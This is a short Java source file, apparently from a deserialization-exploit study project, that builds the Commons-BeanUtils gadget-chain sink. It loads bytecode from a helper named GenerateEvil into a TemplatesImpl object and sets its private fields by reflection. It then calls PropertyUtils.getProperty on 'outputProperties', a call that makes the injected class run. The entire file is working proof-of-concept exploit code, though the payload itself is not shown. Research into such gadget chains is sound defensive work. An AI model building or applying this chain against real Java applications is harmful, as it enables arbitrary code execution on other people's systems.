package com.example.cb;

import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.PropertyUtils;


public class getPropertyExec {
    public static void main(String[] args) throws Exception {
        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj,"_bytecodes",new byte[][]{code});
        Utils.SetValue(obj,"_name","test");
        Utils.SetValue(obj,"_tfactory",new TransformerFactoryImpl());
        PropertyUtils.getProperty(obj,"outputProperties");
    }
}
